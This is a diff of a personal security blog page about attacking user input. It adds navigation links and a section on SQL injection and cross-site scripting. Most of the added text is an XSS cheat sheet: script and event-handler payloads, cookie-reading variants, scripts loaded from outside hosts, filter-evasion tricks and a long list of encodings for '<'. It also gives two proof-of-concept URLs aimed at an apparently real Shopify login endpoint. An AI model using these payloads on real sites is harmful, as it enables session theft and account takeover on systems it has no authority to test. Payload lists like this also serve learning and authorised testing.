@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-09-07T11:31:02 EDT">
+<meta name="revised" content="2019-09-23T10:54:37 EDT">
 <title>USER INPUT OF DOOM :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -527,6 +527,13 @@
         <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
+<li data-nav-id="/webapp/exploiting/" class="dd-item">
+    <div>
+        <a href="/webapp/exploiting/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
 <li data-nav-id="/webapp/burp/" class="dd-item haschildren
         ">
     <div>
@@ -553,6 +560,13 @@
     <div>
         <a href="/webapp/gobuster/">
             GoBuster
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/http-smuggling/" class="dd-item">
+    <div>
+        <a href="/webapp/http-smuggling/">
+            HTTP SMUGGLING
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
@@ -662,10 +676,12 @@
    Linuxes</option>
     <option value="/webapp/" >
    WebApps</option> 
+      <option value="/webapp/exploiting/" >- </option>
     <option value="/webapp/burp/" >
   - 
    Burp</option>
       <option value="/webapp/gobuster/" >- GoBuster</option>
+      <option value="/webapp/http-smuggling/" >- HTTP SMUGGLING</option>
       <option value="/webapp/hydra/" >- Hydra</option>
     <option value="/webapp/skipfish/" >
   - 
@@ -745,9 +761,206 @@
 
 <p>The Null Character <mark>%00</mark>  is fun to play with but there are other characters like <mark>   &amp;   ;   |   </mark>. Sometimes characters can be read read literally. I know there are more escape characters than that, metastable is a good example. when you up the difficulty you have to mix up the characters to bypass the filter to get command injection.</p>
 
-<p>*SANATIZED INPUT Another defense websites will use is to the user input and sanitize the input in such away it&rsquo;s no long malicious. The most evil sanitized input ever is in help line where it will replace everything with null.</p>
+<p><em>SANITIZED</em> INPUT Another defense websites will use is to the user input and sanitize the input in such away it&rsquo;s no long malicious. The most evil sanitized input ever is in help line where it will replace everything with null.</p>
 
-<p>One defense against ccs is to URL -ENCODE  dangerous characters before they are embbed. if it is running some kind exec you could tell it to decode the string xD. You may also Double Encode the payload, i believe something like this was used in crimestoppers.</p>
+<p>One defense against ccs is to URL -ENCODE  dangerous characters before they are embbed. if it is running some kind exec you could tell it to decode the string xD. You may also Double Encode the payload, i believe something like this was used in crime stoppers.</p>
+
+<p><strong>SQL INJECTION OF DOOM</strong></p>
+
+<p>So, really i would like to give something fancy here but there isn&rsquo;t anything fancy to say if you get a server error form entering in the basics you have the beginning of sql injection. i often exaggeration sql there are allot of parameters but using the basic open source tools we have in kali is all we need to enumerate sql. while the scanners run do some manual testing.</p>
+
+<p><strong>XSS    CROSS SITE SCRIPTING</strong></p>
+
+<pre><code>&lt;script&gt;alert(123)&lt;/script&gt;
+&lt;SCRIPT SRC=//xss.rocks/.j&gt;
+&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+\&quot;;alert('XSS');//
+http://m.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
+http://m.com/index.php?user=&lt;script&gt;document.domain&lt;/script&gt;
+</code></pre>
+
+<p>Crossite-scripting this is more of a cheat sheet than anything.</p>
+
+<p><em>TESTING</em></p>
+
+<p><a href="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec</a></p>
+
+<pre><code>&lt;script&gt;alert(123)&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+ &quot;&gt;&lt;svg/onload=alert(document.domain)&gt;
+&lt;SCRIPT SRC=//xss.rocks/.j&gt;
+
+&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+
+Escaping jarascript escapes
+\&quot;;alert('XSS');//
+
+Encoding url, little eindian
+&lt;script src=http://www.example.com/malicious-code.js&gt;&lt;/script&gt;
+\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
+%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
+
+Body
+&lt;body onload=alert('something')&gt;;
+&quot; onmouseover=alert(1) &quot;
+&lt;img src=x onmouseover=alert(1)&gt;
+ &quot;&gt;&lt;svg/onload=alert(document.domain)&gt;
+IMG
+&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;
+
+HREF
+&lt;a href=&quot;&lt;script&gt;alert(8007)&lt;/script&gt;&quot;&gt;Click Me&lt;/a&gt;
+&lt;a href=&quot;http://example.com/index.php#anyone=javascript:alert(1234)&quot;&gt;meow&lt;/a&gt; 
+&lt;a href=&quot;http://example.com/index.php?user=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&quot;&gt;http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
+&lt;/a&gt;
+
+http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
+http://example.com/index.php?user=\&quot;;alert('XSS');//
+http://example.com/index.php?user=%3cscript%3ealert(123)%3e%3c/script%3e
+http://mdsec.net/error/5/Error.ashx?message=&lt;script&gt;alert(1)&lt;/script&gt;
+
+article.php?title=&lt;meta%20http-equiv=&quot;refresh&quot;%20content=&quot;0;&quot;&gt;
+</code></pre>
+
+<pre><code>&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;
+&quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
+&quot;%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;
+%00“&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+</code></pre>
+
+<p>input is inserted into quotes =D &lt; &ldquo;userinput&rdquo;&gt;  sometimes it happens more than youd think.</p>
+
+<pre><code>''; alert(document.domain); var foo=
+javascript:alert(1);
+#”onclick=”javascript:alert(1)
+</code></pre>
+
+<p>tag attributes</p>
+
+<pre><code>&lt;input type=”text” name=”address1” value=”myxsstestdmqlwp”&gt;
+&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&quot;&quot; onfocus=&quot;alert(document.domain)
+</code></pre>
+
+<p>Javascript</p>
+
+<pre><code>&lt;script&gt;var a = 'myxsstestdmqlwp'; var b = 123; ... &lt;/script&gt;
+''; alert(1); var foo=’
+</code></pre>
+
+<p>HTML</p>
+
+<pre><code>&lt;p&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;/p&gt;
+&lt;p&gt;&lt;script&gt;alert[1];&lt;/script&gt;&lt;/p&gt;
+
+</code></pre>
+
+<p>XML**</p>
+
+<p><strong>XML</strong> Breaking the command up into segments javascript</p>
+
+<pre><code>javascript: Markdown [xss](.alert(123);)
+</code></pre>
+
+<p><img src="/home/pwny_sec/Documents/Hugo/sites/blog/static/images/user-input/xss-xml.png" alt="xss-xml" /></p>
+
+<pre><code>POC URL 1:
+
+https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&amp;google_apps_uri=javascript:prompt(document.domain)&amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&amp;ui_locales=en&amp;upgradeable=true&amp;ux=shop
+POC URL 2:
+
+https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&amp;google_apps_uri=javascript:prompt(document.cookie)&amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&amp;ui_locales=en&amp;upgradeable=true&amp;ux=shop
+</code></pre>
+
+<p>**#### TESTING #### **</p>
+
+<pre><code>&lt;HTML&gt;
+&lt;Title&gt;Welcome&lt;/Title&gt;
+Hi&lt;script&gt;alert(123)&lt;/script&gt;
+&lt;/HTML&gt;
+</code></pre>
+
+<p><strong>####</strong></p>
+
+<p>Sometimes evading restrictions on &lt; or bracket can be troublesome.</p>
+
+<pre><code>&lt;
+%3C
+&amp;lt
+&amp;lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&amp;#60;
+&amp;#060;
+&amp;#0060;
+&amp;#00060;
+&amp;#000060;
+&amp;#0000060;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&amp;#x3c;
+&amp;#x03c;
+&amp;#x003c;
+&amp;#x0003c;
+&amp;#x00003c;
+&amp;#x000003c;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&amp;#X3c;
+&amp;#X03c;
+&amp;#X003c;
+&amp;#X0003c;
+&amp;#X00003c;
+&amp;#X000003c;
+&amp;#x3C
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&amp;#x3C;
+&amp;#x03C;
+&amp;#x003C;
+&amp;#x0003C;
+&amp;#x00003C;
+&amp;#x000003C;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+&amp;#X3C;
+&amp;#X03C;
+&amp;#X003C;
+&amp;#X0003C;
+&amp;#X00003C;
+&amp;#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C
+</code></pre>
+
+<p><strong>########### WARNING ###########</strong> DO NOT USES THESE ON ANYONE</p>
 
 
     
